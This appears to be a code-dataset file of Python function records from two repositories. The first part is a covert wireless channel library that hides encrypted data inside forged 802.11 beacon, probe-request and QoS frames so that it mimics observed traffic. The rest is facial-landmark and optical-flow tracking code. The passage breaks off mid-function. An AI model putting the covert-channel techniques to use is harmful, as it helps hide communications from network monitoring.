{"docstring": "\"\"\"\n\nCreates a packet with injected encrypted data.\n\nInject data into the SSID field, this should be considered for modification to a vendor field\n\n\"\"\"\n\n", "func_signal": "def makePacket(self, inject_data):\n", "code": "self.sequence_num = generate_seqnumb()\n\noutbound = self.type + self.frame_control + self.duration + self.DA + self.SA + self.BSSID + self.sequence_num\noutbound = outbound + \"\\x00\" + struct.pack(\"<B\", len(inject_data)) + inject_data \nfor i in range(1, len(self.tags)-1):\n\toutbound = outbound + self.tags[i][0] + struct.pack(\"<B\", self.tags[i][1]) + self.tags[i][2]\n\nreturn self.resize(outbound)", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nreturn the whole tag from an array of tags by its tag id\n\n\"\"\"\n", "func_signal": "def tagGrabber(self, id):\n", "code": "for entry in self.tags:\n\tif (entry[0] == id):\n\t\treturn entry", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nSetup and build the bunny model and starts the read_packet_thread()\n\n\"\"\"\n\n", "func_signal": "def __init__(self):\n", "code": "self.inandout = SendRec()\nself.cryptor = AEScrypt()\nself.model = TrafficModel()\n\n# each item should be an full bunny message that can be passed to the .decrypt() method\n# TODO: put a upper bound of number of messages or a cleanup thread to clear out old messages\n#  if not consumed.\nself.msg_queue = Queue.LifoQueue()\n\n# The out queue is a FiFo Queue because it maintaines the ordering of the bunny data\n#  format: [data, Bool (relay or not)]\nself.out_queue = Queue.Queue()\n\n# The Deque is used because it is a thread safe iterable that can be filled with 'seen'\n# messages between the send and recv threads. \nself.msg_deque = []\n\n# init the threads and name them\nself.workers = [BunnyReadThread(self.msg_queue, self.out_queue, self.inandout, self.model, self.cryptor), \\\n\tBroadCaster(self.out_queue, self.inandout, self.model)]\nself.workers[0].name = \"BunnyReadThread\"\nself.workers[1].name = \"BroadCasterThread\"\n\n# spin up the threads\nfor worker in self.workers:\n\tworker.daemon = True\n\tworker.start()\n\n#TODO: can I add a 'isAlive()' checking loop here?", "path": "libbunny\\bunny.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nCollect packets for the pre determined amount of time.\n\n\"\"\"\n", "func_signal": "def collectData(self):\n", "code": "start_time = time.time()\ncurrent_time = start_time\n\n# caplength is a glocal var from config.\nwhile ( (current_time - start_time) < CAPLENGTH):\n\tpacket = self.interface.recvRaw()\n\tself.data.append(packet)\n\tcurrent_time = time.time()", "path": "libbunny\\TrafficModel.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "# For a speed up we could use the struct.unpack() method\n# self.type, self.frame_control, struct.unpack(\"\", packet)\n", "func_signal": "def __init__(self, packet):\n", "code": "self.type = packet[0:1]\nself.frame_control = packet[1:2]\nself.duration = packet[2:4]\nself.DA = packet[4:10]\nself.SA = packet[10:16]\nself.BSSID = packet[16:22]\nself.sequence_num = packet[22:24]\n\npacket = packet[24:]\n\nwhile (len(packet) >= 4):\n\tid = packet[:1]\n\tlength, = struct.unpack(\"B\", packet[1:2])\n\tvalue = packet[2:length+2]\n\tself.tags.append([id, length, value])\n\tif id == \"\\xdd\":\n\t\tself.vendors.append([value[:3]])\n\tpacket = packet[length + 2:]\n\n# in the event there is zero vendor tags, make one up.\nif len(self.vendors) == 0:\n\tself.vendors.append([os.urandom(3)])\n\n# ProbeRequests get the data injected into the ssid's\n# and are resized by a vendor tag, default SSID length is 12, again \n# possibly signatureable.\nself.injectable = 12", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nreturn the whole tag from an array of tags by its tag id\n\n\"\"\"\n", "func_signal": "def tagGrabber(self, id):\n", "code": "for entry in self.tags:\n\tif (entry[0] == id):\n\t\treturn entry", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\ninput the byte and return a string of the 802.11 type\n\n\"\"\"\n", "func_signal": "def rawToType(self, type_raw):\n", "code": "for k,v in self.Dot11_Types.iteritems():\n\tif (v == type_raw[0]):\n\t\treturn k\nreturn \"reserved (\" + binascii.hexlify(type_raw[0]) + \")\"", "path": "libbunny\\TrafficModel.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "# For a speed up we could use the struct.unpack() method\n#self.type, self.frame_control, struct.unpack(\"\", pack_data)\n", "func_signal": "def __init__(self, packet):\n", "code": "self.type = packet[0:1]\nself.frame_control = packet[1:2]\nself.duration = packet[2:4]\nself.BSSID = packet[4:10]\nself.SA = packet[10:16]\nself.DA = packet[16:22]\nself.sequence_num = packet[22:24]\n#self.RS = packet[21:26]\nself.timestamp = packet[24:32]\nself.beacon_interval = packet[32:34]\nself.capability = packet[34:36]\n\npacket = packet[36:]\n\n# Simple command to debug the current var's of this object.\n# print self.__dict__.keys()\n\n# loop through the tags and SAP them off into in the tags array\n# also appends any vendor OUI's into the vendors list.\n\n# this might be the place we have an error with comp to comp sending.\n# due to the fact it tries read past the end of the.\nwhile (len(packet) >= 4):\n\tid = packet[:1]\n\tlength, = struct.unpack(\"B\", packet[1:2])\n\tvalue = packet[2:length+2]\n\tself.tags.append([id, length, value])\n\tif id == \"\\xdd\":\n\t\tself.vendors.append([value[:3]])\n\tpacket = packet[length + 2:]\n\t\n#self.SSID = self.tagGrabber(\"\\x00\")\n\n# design problem here, after attempting dynamic lengths for the injection\n# fields I relized that for interconnectivity between clients I need to hardcode\n# injection lengths.  So the vendor tag is 24 bytes of data:\nself.injectable = 26 + 2", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nAdds the extracted types and %'s to the model\n\n\"\"\"\n", "func_signal": "def buildModelTypes(self, graphs):\n", "code": "count = 0.0\nfor type in graphs:\n\tcount += type[1]\nfor type in graphs:\n\ttype[1] = (type[1] / count)\n\tself.type_ranges.append(type)", "path": "libbunny\\TrafficModel.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nCreates and returns a beacon packet from the inject_data input\ninject_data must be of length Beacon.injectable\n\ninjectable fields are:\ncapabilities, 2nd to last vendor tags.\n\nNOTE: sequence_num had to be removed due to an issue with the AR9271 firmware, see:\n\thttps://github.com/qca/open-ath9k-htc-firmware/issues/16\n\n\"\"\"\n\n", "func_signal": "def makePacket(self, inject_data):\n", "code": "self.sequence_num = generate_seqnumb()\n\n# timestamp needs more testing.\noutbound = self.type + self.frame_control + self.duration + self.BSSID + self.SA + self.DA + self.sequence_num + self.timestamp + self.beacon_interval + inject_data[0:2]\n\nfor i in range(0, len(self.tags)-2):\n\toutbound = outbound + self.tags[i][0] + struct.pack(\"<B\", self.tags[i][1]) + self.tags[i][2]\noutbound = outbound + \"\\xdd\" + struct.pack(\"<B\", len(inject_data[2:])) + inject_data[2:]\n#outbound += struct.pack(\"!i\", zlib.crc32(outbound))\n\noutbound = self.resize(outbound)\n#print \"len of injectedBEACON: %d\" % len(inject_data)\nreturn outbound", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nResizes the packet with the proper mod / REMAINDER value\n\nPrimarly uses last vendor tag.\n\n\"\"\"\n# counter will be the size of the tag\n# using \\xdd for vendor tag.\n#print self.vendors\n", "func_signal": "def resize(self, outpack):\n", "code": "if len(self.vendors) > 0:\n\ttag = [\"\\xdd\", 0, self.vendors[random.randrange(0, len(self.vendors))][0]]\nelse:\n\ttag = [\"\\xdd\", 0, \"\"]\n\n#while( round((len(outpack) + tag[1] + 2 + RADIOTAPLEN) % MODULUS, 2) != REMAINDER):\nwhile( round((len(outpack) + tag[1] + 2) % MODULUS, 2) != REMAINDER):\n\ttag[2] = tag[2] + os.urandom(1)\n\ttag[1] = len(tag[2])\n\n# + 4 if for eating the checksum that for w/e reason gets parsed as a tag.\t\noutpack = outpack + tag[0] + struct.pack(\"B\", tag[1]) + tag[2]\n\nreturn outpack", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nDecodes the encrypted data out of the inputed packet\n\n\"\"\"\n\n# sequence_num\n#output = input[22:24]\n", "func_signal": "def decode(self, input):\n", "code": "temp_tags = []\n\ninput = input[24:]\ndata_size = len(input)\n\n# This should protect from non-Bunny probe requests being decoded\nif data_size < 4:\n\treturn False\nwhile (len(input) >= 4):\n\tid = input[:1]\n\tlength, = struct.unpack(\"B\", input[1:2])\n\tvalue = input[2:length+2]\n\ttemp_tags.append([id, length, value])\n\tinput = input[length + 2:]\n\t\n# Check the SSID tag for sanity,\nfor tag, length, value in temp_tags:\n\tif tag == \"\\x00\":\n\t\tif length == 0:\n\t\t\treturn False\n\t\telse:\n\t\t\treturn value\n\t\tbreak\nreturn False", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nSend a Bunny (paranoid) packet\n\n\"\"\"\n", "func_signal": "def sendBunny(self, packet):\n", "code": "packet = self.cryptor.encrypt(packet)\n# Prepend the length of the packet as the first two bytes.\n#  This allows for Bunny to know when to stop reading in packets.\nsize = struct.pack(\"H\", len(packet))\npacket = \"%s%s\" % (size, packet)\n\nself.msg_deque.append([packet, time.time()])\nself.out_queue.put([packet, False])", "path": "libbunny\\bunny.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nReturns a frequency adjusted random entry from the array type_ranges\nFollows the [name, freq, ...] structure.\n\n\"\"\"\n", "func_signal": "def getEntry(self):\n", "code": "num = random.random()\ncount = 0.0\nfor entry in self.type_ranges:\n\tcount += entry[1] \n\tif count > num:\n\t\tbreak\nreturn entry", "path": "libbunny\\TrafficModel.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\nreturn the raw packet if the mod/remain value is correct. \nreturns False upon a timeout\n\n\"\"\"\n", "func_signal": "def recPacket_timeout(self, fcs):\n", "code": "start_t = time.time()\nwhile(time.time() - start_t < TIMEOUT):\n\ttry:\n\t\theader, rawPack = self.pcapy.next()\n\texcept PcapError:\n\t\t# This exists because on some hardware, instead of blocking for a packet\n\t\t#  the pcap layer will return a null packet buffer and no error message.\n\t\tcontinue\n\t\t\n\tif rawPack is None:\n\t\tcontinue\n\t# H = unsigned short\n\tsize = struct.unpack(\"<H\", rawPack[2:4])\n\tsize = int(size[0])\n\t\n\t# check if the radio tap header is from the interface face itself (loop backs)\n\t#  that '18' might need to change with different hardware and software drivers\n\tif size >= 18:\n\t\trawPack = rawPack[size:]\n\t\tsize = len(rawPack)\n\t\t# subtract the FCS to account for the radiotap header adding a CRC32\n\t\tif (round( (size - fcs) % MODULUS, 2) == REMAINDER):\n\t\t\treturn rawPack\nelse:\n\treturn False", "path": "libbunny\\SendRec.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nResizes the packet with the proper mod / REMAINDER value\nUses last vendor tag.\n\n\"\"\"\n# counter will be the size of the tag\n# using \\xdd for vendor tag.\n", "func_signal": "def resize(self, outpack):\n", "code": "tag = [\"\\xdd\", 0, self.vendors[-1][0]]\n\nwhile( round( (len(outpack) + tag[1] + 2) % MODULUS, 2) != REMAINDER):\n\ttag[2] = tag[2] + os.urandom(1)\n\ttag[1] = len(tag[2])\noutpack = outpack + tag[0] + struct.pack(\"<B\", tag[1]) + tag[2]\nreturn outpack", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nloops through the type_ranges list and replaces the raw packet data with template objects\ntype_ranges becomes:\n[type, freq, templateObject, injectLen]\n\n\"\"\"\n", "func_signal": "def insertTemplates(self):\n", "code": "tmp_list = []\nfor entry in self.type_ranges:\n\tif entry[0] is None:\n\t\tcontinue\n\ttype = self.rawToType(entry[0])\n\tif (type == \"beacon\"):\n\t\t# replace raw data with object of template type, then append the injection length\n\t\tentry[2] = Templates.Beacon(entry[2])\n\telif (type == \"data\" or type == \"dataQOS\" or type == \"dataQOS2\"):\n\t\tentry[2] = Templates.DataQOS(entry[2])\n\telif (type == \"probeReq\"):\n\t\tentry[2] = Templates.ProbeRequest(entry[2])\n\telse:\n\t\tcontinue\n\ttmp_list.append(entry)\nself.type_ranges = tmp_list", "path": "libbunny\\TrafficModel.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nMake a QOS data packet with injected data, fields are: Sequence num and databody\n\n\"\"\"\n", "func_signal": "def makePacket(self, inject_data):\n", "code": "self.sequence_num = generate_seqnumb()\n\noutbound = self.type + self.frame_control + self.duration+ self.BSSID + self.SA + self.DA + self.sequence_num + self.QOS\n\noutbound = outbound + struct.pack(\"B\", len(inject_data)) + inject_data\n\noutbound = self.resize(outbound)\nreturn outbound", "path": "libbunny\\Templates.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\n\nLoops through all collected packets and creates different aspects of the model\n\n\"\"\"\n", "func_signal": "def extractModel(self):\n", "code": "graphs = []\naddresses = []\n\t\n# loop through all packets, then loop through all types,\n# append if the type is not found,\n# inrement count if it is.\nfor packet in self.data:\n\tbeacon = False\n\t\n\t# graphs[type, count]\n\ttype = packet[:1]\n\t\n\t# check if its a beacon packet\n\tif(type == self.Dot11_Types['beacon']):\n\t\tbeacon = True\n\tfound = False\n\tfor types in graphs:\n\t\tif (type == types[0]):\n\t\t\ttypes[1] = types[1] + 1\n\t\t\tfound = True\n\tif(found == False):\n\t\tgraphs.append([type, 1, packet, 0])\n\t\n\t\n\t# addresses[addr, count, AP?]\n\t# model common mac addresses used\n\tmac = packet[10:15]\n\t\n\tfound = False\n\tfor addr in addresses:\n\t\tif (mac == addr[0]):\n\t\t\taddr[1] = addr[1] + 1\n\t\t\tfound = True\n\tif(found == False):\n\t\tif (beacon == True):\n\t\t\taddresses.append([mac, 1, True])\n\t\telse:\n\t\t\taddresses.append([mac, 1, False])\n\n# sort by count\t\t\ngraphs.sort(key=operator.itemgetter(1), reverse=True)\naddresses.sort(key=operator.itemgetter(1), reverse=True)\n\nself.buildModelTypes(graphs)\nself.buildModelAddresses(addresses)", "path": "libbunny\\TrafficModel.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\" \nClean things up\n\"\"\"\n", "func_signal": "def close(self):\n", "code": "self.lorcon.close()\nself.setmonitor(IFACE, monitor=False)", "path": "libbunny\\SendRec.py", "repo_name": "mothran/bunny", "stars": 932, "license": "None", "language": "python", "size": 360}
{"docstring": "\"\"\"\nArgs:\n  img (PIL.Image): Image to be cropped.\n  point_meta : Point_Meta\nReturns:\n  PIL.Image: Rotated image.\n\"\"\"\n", "func_signal": "def __call__(self, imgs, point_meta):\n", "code": "point_meta = point_meta.copy()\nif isinstance(imgs, list): is_list = True\nelse:                      is_list, imgs = False, [imgs]\n\ndegree = (random.random() - 0.5) * 2 * self.max_rotate_degree\ncenter = (imgs[0].size[0] / 2, imgs[0].size[1] / 2)\nif PIL.__version__[0] == '4':\n  imgs = [ img.rotate(degree, center=center) for img in imgs ]\nelse:\n  imgs = [ img.rotate(degree) for img in imgs ]\n\npoint_meta.apply_rotate(center, degree)\npoint_meta.apply_bound(imgs[0].size[0], imgs[0].size[1])\n\nif is_list == False: imgs = imgs[0]\n\nreturn imgs, point_meta", "path": "lib\\xvision\\transforms.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "# each data is a png file name\n# each label is a Point_Meta class or the general pts format file (anno_parser_v1)\n", "func_signal": "def load_data(self, datas, labels, boxes, face_sizes, num_pts, reset):\n", "code": "assert isinstance(datas, list), 'The type of the datas is not correct : {}'.format( type(datas) )\nassert isinstance(labels, list) and len(datas) == len(labels), 'The type of the labels is not correct : {}'.format( type(labels) )\nassert isinstance(boxes, list) and len(datas) == len(boxes), 'The type of the boxes is not correct : {}'.format( type(boxes) )\nassert isinstance(face_sizes, list) and len(datas) == len(face_sizes), 'The type of the face_sizes is not correct : {}'.format( type(face_sizes) )\nif reset: self.reset(num_pts)\nelse:     assert self.NUM_PTS == num_pts, 'The number of point is inconsistance : {} vs {}'.format(self.NUM_PTS, num_pts)\n\nprint ('[GeneralDataset] load-data {:} datas begin'.format(len(datas)))\n\nfor idx, data in enumerate(datas):\n  assert isinstance(data, str), 'The type of data is not correct : {}'.format(data)\n  assert osp.isfile(datas[idx]), '{} is not a file'.format(datas[idx])\n  self.append(datas[idx], labels[idx], boxes[idx], face_sizes[idx])\n\nassert len(self.datas) == self.length, 'The length and the data is not right {} vs {}'.format(self.length, len(self.datas))\nassert len(self.labels) == self.length, 'The length and the labels is not right {} vs {}'.format(self.length, len(self.labels))\nassert len(self.face_sizes) == self.length, 'The length and the face_sizes is not right {} vs {}'.format(self.length, len(self.face_sizes))\nprint ('Load data done for the general dataset, which has {} images.'.format(self.length))", "path": "lib\\datasets\\GeneralDataset.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "# feature[old,new] : 4-D tensor [1, C, H, W]\n# pts_locations is a 2-D tensor [Num-Pts, (Y,X)]\n", "func_signal": "def lk_tensor_track_batch(feature_old, feature_new, pts_locations, patch_size, max_step, feature_template=None):\n", "code": "if feature_new.dim() == 3:\n  feature_new = feature_new.unsqueeze(0)\nif feature_old is not None and feature_old.dim() == 3:\n  feature_old = feature_old.unsqueeze(0)\nassert feature_new.dim() == 4, 'The dimension of feature-new is not right : {}.'.format(feature_new.dim())\nBB, C, H, W = list(feature_new.size())\nif feature_old is not None:\n  assert 1 == feature_old.size(0) and 1 == BB, 'The first dimension of feature should be one not {}'.format(feature_old.size())\n  assert C == feature_old.size(1) and H == feature_old.size(2) and W == feature_old.size(3), 'The size is not right : {}'.format(feature_old.size())\nassert isinstance(patch_size, int), 'The format of lk-parameters are not right : {}'.format(patch_size)\nnum_pts = pts_locations.size(0)\ndevice = feature_new.device\n\nweight_map = Generate_Weight( [patch_size*2+1, patch_size*2+1] ) # [H, W]\nwith torch.no_grad():\n  weight_map = torch.tensor(weight_map).view(1, 1, 1, patch_size*2+1, patch_size*2+1).to(device)\n\n  sobelconvx = SobelConv('x', feature_new.dtype).to(device)\n  sobelconvy = SobelConv('y', feature_new.dtype).to(device)\n\n# feature_T should be a [num_pts, C, patch, patch] tensor\nif feature_template is None:\n  feature_T = warp_feature_batch(feature_old, pts_locations, patch_size)\nelse:\n  assert feature_old is None, 'When feature_template is not None. feature_old must be None'\n  feature_T = feature_template\nassert feature_T.size(2) == patch_size * 2 + 1 and feature_T.size(3) == patch_size * 2 + 1, 'The size of feature-template is not ok : {}'.format(feature_T.size())\ngradiant_x = sobelconvx(feature_T)\ngradiant_y = sobelconvy(feature_T)\nJ = torch.stack([gradiant_x, gradiant_y], dim=1)\nweightedJ = J * weight_map\nH = torch.bmm( weightedJ.view(num_pts,2,-1), J.view(num_pts, 2, -1).transpose(2,1) )\ninverseH = torch_inverse_batch(H)\n\n#print ('PTS : {}'.format(pts_locations))\nfor step in range(max_step):\n  # Step-1 Warp I with W(x,p) to compute I(W(x;p))\n  feature_I = warp_feature_batch(feature_new, pts_locations, patch_size)\n  # Step-2 Compute the error feature\n  r = feature_I - feature_T\n  # Step-7 Compute sigma\n  sigma = torch.bmm(weightedJ.view(num_pts,2,-1), r.view(num_pts,-1, 1))\n  # Step-8 Compute delta-p\n  deltap = torch.bmm(inverseH, sigma).squeeze(-1)\n  pts_locations = pts_locations - deltap\n\nreturn pts_locations", "path": "lib\\lk\\basic_lk_batch.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "'''\nparse the annotation for MUGSY-Full-Face dataset, which has a fixed format for .pts file\nreturn: pts: 3 x num_pts (x, y, oculusion)\n'''\n", "func_signal": "def anno_parser_v1(anno_path, NUM_PTS, one_base=True):\n", "code": "data, n_points = load_txt_file(anno_path)\nassert n_points <= NUM_PTS, '{} has {} points'.format(anno_path, n_points)\n# read points coordinate\npts = np.zeros((3, NUM_PTS), dtype='float32')\npoint_set = set()\nfor line in data:\n  try:\n    idx, point_x, point_y, oculusion = line.split(' ')\n    idx, point_x, point_y, oculusion = int(idx), float(point_x), float(point_y), oculusion == 'True'\n    if one_base==False: idx = idx+1\n    assert idx >= 1 and idx <= NUM_PTS, 'Wrong idx of points : {:02d}-th in {:s}'.format(idx, anno_path)\n    pts[0, idx-1] = point_x\n    pts[1, idx-1] = point_y\n    pts[2, idx-1] = float( oculusion )\n    point_set.add(idx)\n  except ValueError:\n    raise Exception('error in loading points in {}'.format(anno_path))\nreturn pts, point_set", "path": "lib\\datasets\\dataset_utils.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "# deltp must be [K,2]\n", "func_signal": "def torch_inverse_batch(deltp):\n", "code": "assert deltp.dim() == 3 and deltp.size(1) == 2 and deltp.size(2) == 2, 'The deltp format is not right : {}'.format( deltp.size() )\na, b, c, d = deltp[:,0,0], deltp[:,0,1], deltp[:,1,0], deltp[:,1,1]\na = a + np.finfo(float).eps\nd = d + np.finfo(float).eps\ndivide = a*d-b*c+np.finfo(float).eps\ninverse = torch.stack([d, -b, -c, a], dim=1) / divide.unsqueeze(1)\nreturn inverse.view(-1,2,2)", "path": "lib\\lk\\basic_utils_batch.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "\"\"\"\nArgs:\n  tensor (Tensor): Tensor image of size (C, H, W) to be normalized.\nReturns:\n  Tensor: Normalized image.\n\"\"\"\n# TODO: make efficient\n", "func_signal": "def __call__(self, tensors, points):\n", "code": "if isinstance(tensors, list): is_list = True\nelse:                         is_list, tensors = False, [tensors]\n\nfor tensor in tensors:\n  for t, m, s in zip(tensor, self.mean, self.std):\n    t.sub_(m).div_(s)\n\nif is_list == False: tensors = tensors[0]\n\nreturn tensors, points", "path": "lib\\xvision\\transforms.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "'''\nload a list of files or folders from a list of system path\n'''\n", "func_signal": "def load_list_from_folders(folder_path_list, ext_filter=None, depth=1):\n", "code": "assert isinstance(folder_path_list, list) or isinstance(folder_path_list, str), 'input path list is not correct'\nif isinstance(folder_path_list, str):\n  folder_path_list = [folder_path_list]\n\nfulllist = list()\nnum_elem = 0\nfor folder_path_tmp in folder_path_list:\n  fulllist_tmp, num_elem_tmp = load_list_from_folder(folder_path_tmp, ext_filter=ext_filter, depth=depth)\n  fulllist += fulllist_tmp\n  num_elem += num_elem_tmp\n\nreturn fulllist, num_elem", "path": "lib\\utils\\file_utils.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "\"\"\"\nArgs:\n  img (PIL.Image): Image to be scaled.\n  points 3 * N numpy.ndarray [x, y, visiable]\nReturns:\n  PIL.Image: Rescaled image.\n\"\"\"\n", "func_signal": "def __call__(self, imgs, point_meta):\n", "code": "point_meta = point_meta.copy()\n\ndice = random.random()\nif dice > self.scale_prob:\n  return imgs, point_meta\n\nif isinstance(imgs, list): is_list = True\nelse:                      is_list, imgs = False, [imgs]\n\nscale_multiplier = (self.scale_max - self.scale_min) * random.random() + self.scale_min\n\nw, h = imgs[0].size\now, oh = int(w * scale_multiplier), int(h * scale_multiplier)\n\nimgs = [ img.resize((ow, oh), self.interpolation) for img in imgs ]\npoint_meta.apply_scale( [scale_multiplier] )\n\nif is_list == False: imgs = imgs[0]\n\nreturn imgs, point_meta", "path": "lib\\xvision\\transforms.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "# feature must be [1,C,H,W] and pts_location must be [Num-Pts, (x,y)]\n", "func_signal": "def warp_feature_batch(feature, pts_location, patch_size):\n", "code": "_, C, H, W = list(feature.size())\nnum_pts = pts_location.size(0)\nassert isinstance(patch_size, int) and feature.size(0) == 1 and pts_location.size(1) == 2, 'The shapes of feature or points are not right : {} vs {}'.format(feature.size(), pts_location.size())\nassert W > 1 and H > 1, 'To guarantee normalization {}, {}'.format(W, H)\n\ndef normalize(x, L):\n  return -1. + 2. * x / (L-1)\n\ncrop_box = torch.cat([pts_location-patch_size, pts_location+patch_size], 1)\ncrop_box[:, [0,2]] = normalize(crop_box[:, [0,2]], W)\ncrop_box[:, [1,3]] = normalize(crop_box[:, [1,3]], H)\n \naffine_parameter = [(crop_box[:,2]-crop_box[:,0])/2, crop_box[:,0]*0, (crop_box[:,2]+crop_box[:,0])/2,\n                    crop_box[:,0]*0, (crop_box[:,3]-crop_box[:,1])/2, (crop_box[:,3]+crop_box[:,1])/2]\n#affine_parameter = [(crop_box[:,2]-crop_box[:,0])/2, MU.np2variable(torch.zeros(num_pts),feature.is_cuda,False), (crop_box[:,2]+crop_box[:,0])/2,\n#                    MU.np2variable(torch.zeros(num_pts),feature.is_cuda,False), (crop_box[:,3]-crop_box[:,1])/2, (crop_box[:,3]+crop_box[:,1])/2]\ntheta = torch.stack(affine_parameter, 1).view(num_pts, 2, 3)\nfeature = feature.expand(num_pts,C, H, W)\ngrid_size = torch.Size([num_pts, 1, 2*patch_size+1, 2*patch_size+1])\ngrid = F.affine_grid(theta, grid_size)\nsub_feature = F.grid_sample(feature, grid)\nreturn sub_feature", "path": "lib\\lk\\basic_utils_batch.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "'''\nremove a single item from a list\n'''\n", "func_signal": "def remove_item_from_list(list_to_remove, item):\n", "code": "assert isinstance(list_to_remove, list), 'input list is not a list'\n  \ntry:\n  list_to_remove.remove(item)\nexcept ValueError:\n  print('Warning!!!!!! Item to remove is not in the list. Remove operation is not done.')\n\nreturn list_to_remove", "path": "lib\\datasets\\dataset_utils.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "# pts_location is [X,Y], patch_size is [H,W]\n", "func_signal": "def warp_feature(feature, pts_location, patch_size):\n", "code": "C, H, W = feature.size(0), feature.size(1), feature.size(2)\ndef normalize(x, L):\n  return -1. + 2. * x / (L-1)\n\ncrop_box = [pts_location[0]-patch_size[1], pts_location[1]-patch_size[0], pts_location[0]+patch_size[1], pts_location[1]+patch_size[0]]\ncrop_box[0] = normalize(crop_box[0], W)\ncrop_box[1] = normalize(crop_box[1], H)\ncrop_box[2] = normalize(crop_box[2], W)\ncrop_box[3] = normalize(crop_box[3], H)\naffine_parameter = [(crop_box[2]-crop_box[0])/2, MU.np2variable(torch.zeros(1),feature.is_cuda,False), (crop_box[0]+crop_box[2])/2,\n                    MU.np2variable(torch.zeros(1),feature.is_cuda,False), (crop_box[3]-crop_box[1])/2, (crop_box[1]+crop_box[3])/2]\n\naffine_parameter = torch.cat(affine_parameter).view(2, 3)\n \ntheta = affine_parameter.unsqueeze(0)\nfeature = feature.unsqueeze(0)\ngrid_size = torch.Size([1, 1, 2*patch_size[0]+1, 2*patch_size[1]+1])\ngrid = F.affine_grid(theta, grid_size)\nsub_feature = F.grid_sample(feature, grid).squeeze(0)\nreturn sub_feature", "path": "lib\\lk\\basic_utils.py", "repo_name": "facebookresearch/supervision-by-registration", "stars": 747, "license": "other", "language": "python", "size": 7044}
{"docstring": "## compute total average normlized mean error\n", "func_signal": "def evaluate_normalized_mean_error(predictions, groundtruth, log, extra_faces):\n", "code": "assert len(predictions) == len(groundtruth), 'The lengths of predictions and ground-truth are not consistent : {} vs {}'.format( len(predictions), len(groundtruth) )\nassert len(predictions) > 0, 'The length of predictions must be greater than 0 vs {}'.format( len(predictions) )\nif extra_faces is not None: assert len(extra_faces) == len(predictions), 'The length of extra_faces is not right {} vs {}'.format( len(extra_faces), len(predictions) )\nnum_images = len(predictions)\nfor i in range(num_images):\n  c, g = predictions[i], groundtruth[i]\n  assert isinstance(c, np.ndarray) and isinstance(g, np.ndarray), 'The type of predictions is not right : [{:}] :: {} vs {} '.format(i, type(c), type(g))\n\nnum_points = predictions[0].shape[1]\nerror_per_image = np.zeros((num_images,1))\nfor i in range(num_images):\n  detected_points = predictions[i]\n  ground_truth_points = groundtruth[i]\n  if num_points == 68:\n    interocular_distance = np.linalg.norm(ground_truth_points[:2, 36] - ground_truth_points[:2, 45])\n    assert bool(ground_truth_points[2,36]) and bool(ground_truth_points[2,45])\n  elif num_points == 51 or num_points == 49:\n    interocular_distance = np.linalg.norm(ground_truth_points[:2, 19] - ground_truth_points[:2, 28])\n    assert bool(ground_truth_points[2,19]) and bool(ground_truth_points[2,28])\n  elif num_points == 19:\n    assert extra_faces is not None and extra_faces[i] is not None\n    interocular_distance = extra_faces[i]\n  else:\n    raise Exception('----> Unknown number of points : {}'.format(num_points))\n  dis_sum, pts_sum = 0, 0\n  for j in range(num_points):\n    if bool(ground_truth_points[2, j]):\n      dis_sum = dis_sum + np.linalg.norm(detected_points[:2, j] - ground_truth_points[:2, 